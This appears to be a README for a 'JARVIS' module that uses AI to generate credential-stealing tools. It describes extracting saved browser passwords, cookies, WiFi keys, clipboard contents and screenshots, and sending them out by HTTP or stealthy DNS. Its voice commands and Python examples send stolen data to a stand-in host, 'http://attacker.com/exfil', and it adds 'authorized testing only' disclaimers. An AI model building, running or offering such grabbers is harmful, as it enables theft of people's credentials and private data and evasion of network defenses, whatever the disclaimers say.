# AI Credential Grabber Guide

## Overview

JARVIS includes an AI-powered credential grabber system for authorized security testing and educational purposes.

⚠️ **WARNING**: For authorized testing and educational purposes only. Never use on systems you don't own or without proper authorization.

## Features

### Browser Credential Grabber
- Extract passwords from Chrome, Firefox, Edge
- Extract cookies
- Support for multiple browsers
- Exfiltration via HTTP, DNS, or file

### System Information Grabber
- WiFi passwords
- System information
- Clipboard contents
- Screenshots
- Custom grab types

### AI-Enhanced Grabber
- Generate custom grabbers from descriptions
- AI-powered code generation
- Flexible and adaptable

## Voice Commands

### Browser Grabber
```
"Create AI browser credential grabber"
"AI grab browser passwords from Chrome and Firefox"
"Create credential grabber for Chrome with HTTP exfiltration to http://attacker.com"
"AI grab cookies from all browsers"
```

### System Grabber
```
"Create AI system information grabber"
"AI grab WiFi passwords and system info"
"Create grabber for WiFi, clipboard, and screenshots"
"AI grab system information"
```

### AI-Enhanced
```
"AI generate a credential grabber that extracts passwords and sends via DNS"
"Create AI grabber for extracting all browser data"
"AI make a grabber that gets WiFi passwords and system info"
```

## Usage Examples

### Browser Grabber
```python
from cybersecurity.ai_credential_grabber import AICredentialGrabber

grabber = AICredentialGrabber()

# Create browser grabber
result = grabber.create_browser_grabber(
    browsers=['chrome', 'firefox'],
    exfil_url='http://attacker.com/exfil'
)
```

### System Grabber
```python
# Create system grabber
result = grabber.create_system_grabber(
    grab_types=['wifi', 'system', 'clipboard', 'screenshots']
)
```

### AI-Enhanced
```python
# AI-generated grabber
result = grabber.create_ai_enhanced_grabber(
    description="Extract all browser passwords and cookies, send via encrypted HTTP",
    features=['encryption', 'stealth', 'multiple_browsers']
)
```

## What Gets Grabbed

### Browser
- Saved passwords
- Cookies
- Session data
- Auto-fill data

### System
- WiFi passwords
- System information (hostname, OS, etc.)
- Clipboard contents
- Screenshots

## Exfiltration Methods

### HTTP
- Send data via POST request
- JSON format
- Encrypted option

### DNS
- Encode data in DNS queries
- Stealthy exfiltration
- Bypass network filters

### File
- Save to local file
- For testing purposes
- No network required

## Security Notes

⚠️ **IMPORTANT**:
- All grabbers include warnings
- Use only in isolated VMs
- Get authorization before testing
- Never use on production systems
- Follow responsible disclosure
- This is for educational and authorized testing only

## Legal and Ethical

**ALLOWED**:
- ✅ Testing your own systems
- ✅ Authorized penetration testing
- ✅ Security research with permission
- ✅ Educational purposes
- ✅ Bug bounty programs (with authorization)

**NOT ALLOWED**:
- ❌ Testing without authorization
- ❌ Accessing others' credentials
- ❌ Production systems without permission
- ❌ Violating terms of service
- ❌ Malicious purposes

## Best Practices

1. **Always get authorization** before testing
2. **Use isolated test environments** only
3. **Review generated code** before running
4. **Understand what the code does**
5. **Follow responsible disclosure** for vulnerabilities
6. **Document your testing** for authorized work

## Troubleshooting

### "Error extracting passwords"
- Check browser is closed (locks database)
- Verify browser path is correct
- Check permissions

### "Exfiltration failed"
- Verify exfil URL is accessible
- Check network connectivity
- Review error messages

### "AI generation failed"
- Check LLM is available
- Verify API keys if using cloud LLM
- Try simpler description

---

**Remember: Use responsibly and only for authorized security testing!**
